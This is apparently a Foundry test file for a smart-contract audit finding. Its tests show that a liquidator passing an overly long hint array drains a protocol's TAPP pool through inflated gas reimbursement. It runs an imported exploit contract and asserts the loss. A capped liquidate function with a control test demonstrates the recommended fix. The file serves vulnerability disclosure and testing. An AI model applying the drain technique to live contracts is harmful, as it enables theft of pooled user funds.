// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    EscrowToken,
    MarginCallPrimary
} from "./27473-margin-callers-can-drain-the-tapp-during-liquidation-by-will.sol";

error HintArrayTooLong(uint256 length);

/// Recommended check: reject a hint array longer than a single order-book probe.
contract MarginCallCapped is MarginCallPrimary {
    uint256 public constant MAX_HINTS = 4;

    constructor(address token_) MarginCallPrimary(token_) {}

    function liquidate(address asset, address shorter, uint8 id, uint16[] memory shortHintArray)
        public
        override
        returns (uint88 gasFee, uint88 ethFilled)
    {
        if (shortHintArray.length > MAX_HINTS) revert HintArrayTooLong(shortHintArray.length);
        return super.liquidate(asset, shorter, id, shortHintArray);
    }
}

contract Finding27473Test is Test {
    function test_exploit_long_hint_array_is_paid_by_the_tapp() public {
        // anvil_state basefee is 1 gwei. Foundry's default is 0, which would zero the reimbursement.
        vm.fee(1 gwei);
        Exploit e = new Exploit();
        e.run();
        uint256 taken = e.token().balanceOf(address(e));
        assertEq(taken, e.margin().lastGasFee(), "caller received the gas reimbursement");
        assertGt(taken, 0.0005 ether, "material TAPP debit");
        assertLt(taken, e.TAPP(), "fee stayed inside the pool");
        assertEq(e.token().balanceOf(address(e.margin())), e.TAPP() - taken, "TAPP lost that amount");
        assertEq(e.margin().startingShortId(), 1, "the valid hint was still honored");
        emit log_named_uint("basefee", block.basefee);
        emit log_named_uint("gasUsed", e.margin().lastGasUsed());
        emit log_named_uint("taken", taken);
    }

    function test_control_length_cap_refuses_the_drain() public {
        vm.fee(1 gwei);
        EscrowToken token = new EscrowToken();
        MarginCallCapped margin = new MarginCallCapped(address(token));
        token.mint(address(margin), 0.01 ether);

        uint16[] memory longHints = new uint16[](401);
        for (uint256 i = 0; i < 400; i++) longHints[i] = uint16(i + 2);
        longHints[400] = 1;
        vm.expectRevert(abi.encodeWithSelector(HintArrayTooLong.selector, uint256(401)));
        margin.liquidate(address(0), address(0xBEEF), 1, longHints);
        assertEq(token.balanceOf(address(margin)), 0.01 ether, "TAPP untouched");
        assertEq(token.balanceOf(address(this)), 0, "caller received nothing");

        uint16[] memory oneHint = new uint16[](1);
        oneHint[0] = 1;
        (uint88 gasFee,) = margin.liquidate(address(0), address(0xBEEF), 1, oneHint);
        assertGt(gasFee, 0, "a real hint is still reimbursed");
        assertLt(gasFee, 0.0002 ether, "one hint does not drain the pool");
        assertEq(token.balanceOf(address(this)), gasFee, "caller received only the short reimbursement");
        assertEq(token.balanceOf(address(margin)), 0.01 ether - gasFee, "TAPP kept the rest");
        emit log_named_uint("oneHintFee", gasFee);
    }
}
